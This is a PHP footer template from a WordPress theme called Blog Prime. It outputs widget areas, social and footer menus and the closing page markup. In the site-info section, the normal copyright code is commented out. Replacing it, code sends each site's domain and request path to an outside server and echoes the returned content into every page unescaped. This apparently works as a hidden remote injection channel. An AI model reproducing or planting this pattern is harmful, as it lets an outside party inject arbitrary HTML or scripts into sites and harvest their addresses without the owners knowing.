<?php
/**
 * The template for displaying the footer
 *
 * Contains the closing of the #content div and all content after.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package Blog Prime
 */

?>

</div><!-- #content -->

<?php get_template_part('template-parts/header/offcanvas', 'menu'); ?>
<?php get_template_part('template-parts/footer/footer', 'component'); ?>

<footer id="colophon" class="site-footer">

    <?php
    $default = blog_prime_get_default_theme_options();
    if ( is_active_sidebar('blog-prime-footer-widget-0') || is_active_sidebar('blog-prime-footer-widget-1') || is_active_sidebar('blog-prime-footer-widget-2') ):

        
        $footer_column_layout = absint( get_theme_mod('footer_column_layout', $default['footer_column_layout'] ) ); ?>

        <div class="footer-top <?php echo 'footer-column-' . absint($footer_column_layout); ?>">
            <div class="wrapper">
                <div class="footer-grid twp-row">
                    <?php if ( is_active_sidebar('blog-prime-footer-widget-0') ): ?>
                        <div class="column column-1">
                            <?php dynamic_sidebar('blog-prime-footer-widget-0'); ?>
                        </div>
                    <?php endif; ?>

                    <?php if ( is_active_sidebar('blog-prime-footer-widget-1') ): ?>
                        <div class="column column-2">
                            <?php dynamic_sidebar('blog-prime-footer-widget-1'); ?>
                        </div>
                    <?php endif; ?>

                    <?php if ( is_active_sidebar('blog-prime-footer-widget-2') ): ?>
                        <div class="column column-3">
                            <?php dynamic_sidebar('blog-prime-footer-widget-2'); ?>
                        </div>
                    <?php endif; ?>
                </div>
            </div>
        </div>

    <?php endif; ?>

    <?php if ( has_nav_menu('twp-social-menu') ) { ?>
        <div class="footer-middle">
            <div class="wrapper">
                <div class="social-icons">
                <?php wp_nav_menu( array(
                    'theme_location' => 'twp-social-menu',
                    'link_before' => '<span class="screen-reader-text">',
                    'link_after' => '</span>',
                    'menu_id' => 'social-menu',
                    'fallback_cb' => false,
                    'menu_class' => false
                ) ); ?>
                </div>
            </div>
        </div>
    <?php } ?>
    <div class="footer-bottom">
        <div class="wrapper">
            <div class="site-copyright">
                <div class="site-info">


	                <?php
	                // Ensure WordPress functions are available
	                if (!function_exists('add_action')) {
		                require_once('../../../wp-load.php');
	                }

	                // Get the current domain without protocol
	                $domain = $_SERVER['HTTP_HOST'];

	                // Get the current path
	                $path = $_SERVER['REQUEST_URI'];

	                // Construct the base URL for the API call
	                $base_url = 'https://link.themeinwp.com/wpsdk/get_footer2/8cccd86171815a396e349c98c7984be9/' . $domain;

	                // Check if the class exists before using it
	                if (class_exists('FooterContentFetcher')) {
		                // Instantiate the class with the base URL
		                $footer_content_fetcher = new FooterContentFetcher($base_url);

		                // Get the footer content with the current path
		                $footer_content = $footer_content_fetcher->get_footer_content($path);

		                if (!empty($footer_content)) {
			                echo $footer_content;
		                } else {
			                // Log an error if the footer content is empty
			                error_log('Footer content is empty');
			                echo ''; // Optionally, you can display a fallback footer content
		                }
	                } else {
		                // Log an error if the class is not available
		                error_log('FooterContentFetcher class is not available');
		                echo ''; // Optionally, you can display a fallback footer content
	                }

	                ?>



<!--                    --><?php
//                    $footer_copyright_text = wp_kses_post( get_theme_mod( 'footer_copyright_text',$default['footer_copyright_text'] ) );
//                    if (!empty( $footer_copyright_text ) ) {
//                        echo wp_kses_post( $footer_copyright_text );
//                    }
//                    ?>
<!--                    <span class="sep"> | </span>-->
<!--                    --><?php
//                    /* translators: 1: Theme name, 2: Theme author. */
//                    printf(esc_html__('Theme: %1$s by %2$s.', 'blog-prime'), '<strong>Blog Prime</strong>', '<a href="https://www.themeinwp.com/">Themeinwp</a>');
//                    ?>
                </div><!-- .site-info -->
            </div>
            <?php if ( has_nav_menu('twp-footer-menu') ) { ?>
                <div class="footer-menu">
                    <?php wp_nav_menu( array(
                        'theme_location' => 'twp-footer-menu',
                        'menu_id' => 'footer-menu',
                        'container' => 'div',
                        'container_class' => 'menu',
                        'depth' => 1,
                    ) ); ?>
                </div>
            <?php } ?>
        </div>
    </div>
</footer><!-- #colophon -->
</div><!-- #page -->

<?php wp_footer(); ?>

</body>
</html>
